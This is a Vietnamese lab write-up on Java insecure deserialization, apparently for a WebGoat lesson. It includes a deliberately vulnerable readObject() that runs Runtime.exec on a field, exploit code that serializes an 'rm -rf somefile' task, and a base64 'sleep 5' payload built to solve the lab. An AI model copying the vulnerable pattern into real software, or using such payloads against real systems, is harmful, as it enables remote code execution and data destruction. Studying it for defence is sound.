# Insecure Deserialization

- [Insecure Deserialization](#insecure-deserialization)
    - [A. Lý thuyết trong bài lab](#a-lý-thuyết-trong-bài-lab)
      - [1. Mục tiêu bài lab](#1-mục-tiêu-bài-lab)
      - [2. Serialization và Deserialization là gì ?](#2-serialization-và-deserialization-là-gì-)
      - [3. Một ví dụ khai thác đơn giản](#3-một-ví-dụ-khai-thác-đơn-giản)
    - [B. Thực hành](#b-thực-hành)

### A. Lý thuyết trong bài lab 

#### 1. Mục tiêu bài lab

Hiểu được Serialization, Deserialization và cách thực hiện khai thác nó, dùng với mục đích khác ban đầu.

#### 2. Serialization và Deserialization là gì ?

Trong quá trình truyền dữ liệu hoặc lưu dữ liệu vào một tệp thì người thường thực hiện dưới dạng dữ liệu là byte, XML, Json,... Vậy để có thể truyền hoặc lưu dữ liệu là một object thì sao ?

Serialization và Deserialization được dùng để xử lý cho vấn đề được đặt ra ở trên.

![](https://i.imgur.com/YpDMm6b.png)

- Serialization là quá trình chuyển đổi trạng thái thông tin của một object thành một hình thức dữ liệu có thể lưu trữ hoặc truyền đi.
- Deserialization là quá trình ngược lại, nó khôi phục dữ liệu thành object ban đầu.

> Lưu ý : Quá trình Serialization chỉ có `data` được serialize còn `code` thì không. Còn quá trình Deserialization thì sẽ tạo ra một object mới copy tất cả các `data` vào object mới đó để có được một object giống với object đã Serialize. 

Nhiều ngôn ngữ cung cấp hỗ trợ riêng cho việc serializing object được gọi là Native Serialization. Với format riêng đó thì sẽ cung cấp nhiều tính năng hơn JSON hoặc XML và có thể tùy chỉnh cho quá trình Serialization. Nhưng cơ chế Deserialization native có thể được sử dụng để gây ảnh hưởng xấu khi hoạt động trên dữ liệu không đáng tin cậy. Từ đó có thể gây ra nhiều cuộc tấn công DDos, access control, remote code execution attacks... 

#### 3. Một ví dụ khai thác đơn giản

Dưới đây là một ví dụ khá nổi tiếng cho Java Deserialization vulnerability

```java
InputStream is = request.getInputStream();
ObjectInputStream ois = new ObjectInputStream(is);
AcmeObject acme = (AcmeObject)ois.readObject();
```

Đầu tiên đoạn code thực hiện việc `getInputSteam` từ request và chuyển nó thành một `ObjectInputSteam`. Sau đó ép kiểu về `AcmeObject` nhưng ở đây nó sẽ thực hiện phương thức `readObject()` trước khi quá trình ép kiểu hoàn tất. 


```java
package org.dummy.insecure.framework;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.time.LocalDateTime;

public class VulnerableTaskHolder implements Serializable {

        private static final long serialVersionUID = 1;

        private String taskName;
        private String taskAction;
        private LocalDateTime requestedExecutionTime;

        public VulnerableTaskHolder(String taskName, String taskAction) {
                super();
                this.taskName = taskName;
                this.taskAction = taskAction;
                this.requestedExecutionTime = LocalDateTime.now();
        }

        private void readObject( ObjectInputStream stream ) throws Exception {
        //deserialize data so taskName and taskAction are available
                stream.defaultReadObject();

                //blindly run some code. #code injection
                Runtime.getRuntime().exec(taskAction);
     }
}
```

Trên đây là lớp chứa phương thức `readObject()` . Ta thấy phương thức này sẽ thực thi code một cách bất chấp không qua một quá trình kiểm tra nào cả bằng câu lệnh `Runtime.getRuntime().exec(taskAction)` . Vậy attacker chỉ việc thực hiện serialize một object với `taskAction` mình mong muốn là có thể tiến hành được một cuộc tấn công `remote code execution`. 

Dưới đây là đoạn code khai thác với taskAction là `rm -rf somefile` :

```java
VulnerableTaskHolder go = new VulnerableTaskHolder("delete all", "rm -rf somefile");

ByteArrayOutputStream bos = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(bos);
oos.writeObject(go);
oos.flush();
byte[] exploit = bos.toByteArray();
```


### B. Thực hành

![](https://i.imgur.com/HKZZJOV.png)

Đề yêu cầu ta cố gắng thay đổi serialized object để delay việc phản hồi trang trong chính xác 5 giây

Như ví dụ ở trên thì ta cần tìm `class` phù hợp để biết xem cần làm gì tiếp theo. Dựa vào hint 

![](https://i.imgur.com/OKWWZEb.png)

Chúng ta lên git tìm kiếm và tìm thấy file `java` sau :

```java
package org.dummy.insecure.framework;

import lombok.extern.slf4j.Slf4j;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.time.LocalDateTime;

@Slf4j
//TODO move back to lesson
public class VulnerableTaskHolder implements Serializable {

	private static final long serialVersionUID = 2;

	private String taskName;
	private String taskAction;
	private LocalDateTime requestedExecutionTime;
	
	public VulnerableTaskHolder(String taskName, String taskAction) {
		super();
		this.taskName = taskName;
		this.taskAction = taskAction;
		this.requestedExecutionTime = LocalDateTime.now();
	}
	
	@Override
	public String toString() {
		return "VulnerableTaskHolder [taskName=" + taskName + ", taskAction=" + taskAction + ", requestedExecutionTime="
				+ requestedExecutionTime + "]";
	}

	/**
	 * Execute a task when de-serializing a saved or received object.
	 * @author stupid develop
	 */
	private void readObject( ObjectInputStream stream ) throws Exception {
        //unserialize data so taskName and taskAction are available
		stream.defaultReadObject();
		
		//do something with the data
		log.info("restoring task: {}", taskName);
		log.info("restoring time: {}", requestedExecutionTime);
		
		if (requestedExecutionTime!=null && 
				(requestedExecutionTime.isBefore(LocalDateTime.now().minusMinutes(10))
				|| requestedExecutionTime.isAfter(LocalDateTime.now()))) {
			//do nothing is the time is not within 10 minutes after the object has been created
			log.debug(this.toString());
			throw new IllegalArgumentException("outdated");
		}
		
		//condition is here to prevent you from destroying the goat altogether
		if ((taskAction.startsWith("sleep")||taskAction.startsWith("ping"))
				&& taskAction.length() < 22) {
		log.info("about to execute: {}", taskAction);
		try {
            Process p = Runtime.getRuntime().exec(taskAction);
            BufferedReader in = new BufferedReader(
                                new InputStreamReader(p.getInputStream()));
            String line = null;
            while ((line = in.readLine()) != null) {
                log.info(line);
            }
        } catch (IOException e) {
            log.error("IO Exception", e);
        }
		}
       
    }
	
}
```

Ở đây ta thấy tại phương thức `readObject` thì với `taskAction` bắt đầu bằng từ `sleep` hoặc `ping` và có độ dài dưới 22 thì sẽ cố gắng thực hiện `taskAction` đó bằng lệnh `Runtime.getRuntime().exec(taskAction)`. Vậy nên ta chỉ cần truyền một serialize object với `taskAction = sleep 5` để có thể delay chính xác 5 giây là hoàn thành yêu cầu của đề bài. 

Vậy ta đã xác định được vấn đề, bây giờ ta thực hiện code tạo ra serialize object với `taskAction = sleep 5` như sau 

```java
import java.io.*;
import java.util.*;
import java.time.*;
import org.dummy.insecure.framework.VulnerableTaskHolder;

public class Program {
   public static void main(String args[]) throws Exception{

    VulnerableTaskHolder o = new VulnerableTaskHolder("delayRespone", "sleep 5");
    ByteArrayOutputStream baos = new ByteArrayOutputStream();
    ObjectOutputStream oos = new ObjectOutputStream(baos);
    oos.writeObject(o);
    oos.flush();
    byte[] exploit = baos.toByteArray();
    System.out.println(Base64.getEncoder().encodeToString(exploit));
    
   }
}
```

Exploit code này tương tự như ví dụ đã cho ở trên. Chỉ thêm dòng xuất kết quả. Sau khi thực hiện thì ta được kết quả như sau :

![](https://i.imgur.com/W36QpZg.png)

ta chỉ cần copy kết quả bỏ vào phần token rồi bấm submit là hoàn thành 

![](https://i.imgur.com/MmWio4S.png)

